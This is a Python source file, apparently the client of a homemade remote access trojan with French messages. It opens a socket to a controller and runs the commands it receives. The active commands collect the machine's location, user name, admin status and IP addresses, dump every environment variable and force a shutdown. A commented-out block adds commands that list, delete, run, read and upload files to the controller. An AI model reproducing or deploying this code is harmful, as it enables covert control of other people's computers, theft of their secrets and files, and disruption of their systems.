# -*- coding: utf-8 -*-

from tkinter import *
import socket
import os
import subprocess
import time
import datetime
import shutil
import platform
import urllib
import requests
import json
from functools import partial
import ctypes
import ipgetter

def convert(value):
    value = int(value)
    type = 'o'
    if value > 1024:
        value = round(value/1024)
        type = 'Ko'
        if value > 1024:
            value = round(value/1024)
            type = 'Mo'
            if value > 1024:
                value = round(value/1024)
                type = 'Go'
    return str(value),str(type)

def setMessage(message):
    window = Tk()
    label = Label(window,text=str(message), bg='light gray')
    label.config(font=("Courier", 20))
    label.pack()
    window.mainloop()
    return (">>>command message '" + message + "'\nMessage '" + message + "' affiché avec succes.").encode()
 
def getInfos():
    username = os.environ['USERNAME']
    publicIp = ipgetter.myip()
    name = socket.gethostname()
    localIp = socket.gethostbyname(name)
    send_url = 'http://freegeoip.net/json'
    r = requests.get(send_url)
    j = json.loads(r.text)
    country = j['country_name']
    region = j['region_name']
    city = j['city']
    admin = "Yes"
    if ctypes.windll.shell32.IsUserAnAdmin() == 0:
        admin = "No"
    out = ">>>command infos\nCountry: " + country + "\nRegion: " + region + "\nCity: " + city + "\nComputer Name: " + str(name) + "\nUser Name: " + str(username) + "\nAdmin: " + admin + "\nLocal Ip: " + str(localIp) + "\nPublic Ip: " + str(publicIp)
    return out

def getEnviron():
    out = ">>>command environ\n"
    for n, v in os.environ.items():
        out += str(n) + " -> " + str(v) + "\n"
    return out
    
def setShutdown():
    os.system('shutdown -s')
    return 'command shutdown -s\nShutdown en cours'
    
def cmdrecv():
    cmd = server_co.recv(1024)
    cmd = cmd.decode()
    cmd = cmd.split(' ')
    if cmd[0] == 'infos':
        return getInfos().encode()
    elif cmd[0] == 'environ':
        return getEnviron().encode()
    elif cmd[0] == 'message':
        if len(cmd) == 1:
            return b'message <message>'
        message = " ".join(cmd[1:])
        return setMessage(message)
    elif cmd[0] == 'shutdown':
        return setShutdown().encode()
    # if cmd[0] == 'environ':
        # out = "\n"
        # for n, v in os.environ.items():
            # out += str(n) + " -> " + str(v) + "\n"
        # return out.encode()
    # elif cmd[0] == 'ipconfig':
        # p = subprocess.Popen("ipconfig", stdout=subprocess.PIPE, shell=True)
        # out, error = p.communicate()
        # return out
    # elif cmd[0] == 'dir':
        # p = subprocess.Popen("dir", stdout=subprocess.PIPE, shell=True)
        # out, error = p.communicate()
        # return out
    # elif cmd[0] == 'mkdir':
        # if len(cmd) == 2:
            # os.system('mkdir ' + cmd[1])
            # return b"Folder created"
        # else:
            # return b"mkdir <path>"
    # elif cmd[0] == 'listdir':
        # infs = []
        # path = os.getcwd()
        # if len(cmd) == 2:
            # path = str(cmd[1])
        # try:
            # dirs = os.listdir(path)
        # except:
            # return b'Unknown path'
        # for dir in dirs:
            # stats = os.stat(path + "\\" + dir)
            # type = 'Unknown'
            # if os.path.isfile(path + "\\" + dir):
                # type = 'file'
            # elif os.path.isdir(path + "\\" + dir):
                # type = 'folder'
            # infs.append([dir,stats.st_size,type,datetime.datetime.fromtimestamp(os.path.getmtime(path + "\\" + dir))])
        # out = "\n"
        # for inf in infs:
            # size = str(inf[1])
            # size = convert(size)[0] + convert(size)[1]
            # out += (str(inf[0]).ljust(40) + size.ljust(10) + inf[2].ljust(10) + str(str(inf[3]).split('.')[0]) + "\n")
        # return out.encode()
    # elif cmd[0] == 'ifexist':
        # if len(cmd) == 1:
            # return b'ifexist <path>'
        # return str(os.path.isfile(cmd[1]) or os.path.isdir(cmd[1])).encode()
    # elif cmd[0] == 'remove':
        # if len(cmd) == 1:
            # return b'remove <path>'
        # try:
            # os.remove(cmd[1])
        # except:
            # return b'Unknown path'
        # return b'file removed'
    # elif cmd[0] == 'exe':
        # if len(cmd) == 1:
            # return b'exe <path>'
        # try:
            # extension = cmd[1].split('.')[-1]
            # print("DEBUG -> " + extension)
        # except:
            # return b'file with not extension'
        # os.system('start ' + cmd[1])
        # return b'file executed'
    # elif cmd[0] == 'netstat':
        # out, error = subprocess.Popen("netstat", stdout=subprocess.PIPE, shell=True).communicate()
        # out = out.decode(encoding='utf-8',errors='ignore')
        # tOut = ''
        # for i in out.split('\n'):
            # tOut += i + '\n'
        # out = tOut.encode()
        # return out
    # elif cmd[0] == 'open':
        # if len(cmd) == 1:
            # return b'open <path>'
        # try:
            # extension = cmd[1].split('.')[-1]
        # except:
            # return b'file with not extension'
        # if extension not in ['txt','py','js','css']:
            # return b'extension is not \'txt\' \'py\' \'js\' \'css\''
        # else:
            # file = open(cmd[1],'rb')
            # contenu = file.read()
            # contenu = str(contenu).encode(encoding='utf-8',errors='ignore').decode(encoding='utf-8',errors='ignore')
            # tOut = contenu.split('\n')
            # out = ''
            # for line in tOut:
                # out += line + '\n'
            # return out.encode()
    # elif cmd[0] == 'copy':
        # if len(cmd) <= 2:
            # return b'copy <src> <dist>'
        # shutil.copyfile(cmd[1],cmd[2])
        # return b'copy executed'
    # elif cmd[0] == 'import':
        # if len(cmd) == 1:
            # return b'import <path>'
        # try:
            # extension = cmd[1].split('.')[-1]
        # except:
            # extension = ''
        # try:
            # file = open(cmd[1],'rb')
        # except:
            # b'Unknown file'
        # print('Sending...')
        # l = file.read(1024)
        # out = b'FILE::' + extension.encode() + b'::' + l
        # while(l):
            # l = file.read(1024)
            # out += l
        # return out
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
    # elif cmd[0] == 'shutdown':
        # os.system('shutdown -s')
        # return b'shutdown in process'
    # elif cmd[0] == 'os':
        # infos = platform.uname()
        # out = 'System: ' + infos[0] + '\nNode: ' + infos[1] + '\nRelease: ' + infos[2] + '\nVersion: ' + infos[3] + '\nMachine: ' + infos[4] + '\nProcessor: ' + infos[5]
        # return out.encode()
    # elif cmd[0] == 'geo':
        # send_url = 'http://freegeoip.net/json'
        # r = requests.get(send_url)
        # j = json.loads(r.text)
        # out = ''
        # for i,j in j.items():
            # out += str(i) + ': ' + str(j) + '\n'
        # return out.encode()
    return b'Unknown command'

def sendconfirm(message):
    server_co.send(message + b' / ' + location.encode())
hote = "127.0.0.1"
port = 25565
location = os.path.realpath(__file__)
location = location.replace("client.py", "")
server_co = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tentative = 0
def connect(hote,port):
    global tentative
    tentative += 1
    try:
        server_co.connect((hote, port))
        return True
    except:
        print('Server not found (' + str(tentative) + ')' )
        return False
        
isConnect = False
while isConnect == False:
    isConnect = connect(hote,port)
    if isConnect:
            print("[*] Connected")
            msg = b""
            while msg != "fin":
                res = cmdrecv()
                sendconfirm(res)
                if msg == 'fin':
                    break
    else:
        time.sleep(1)
print("[*] Session close")
server_co.close()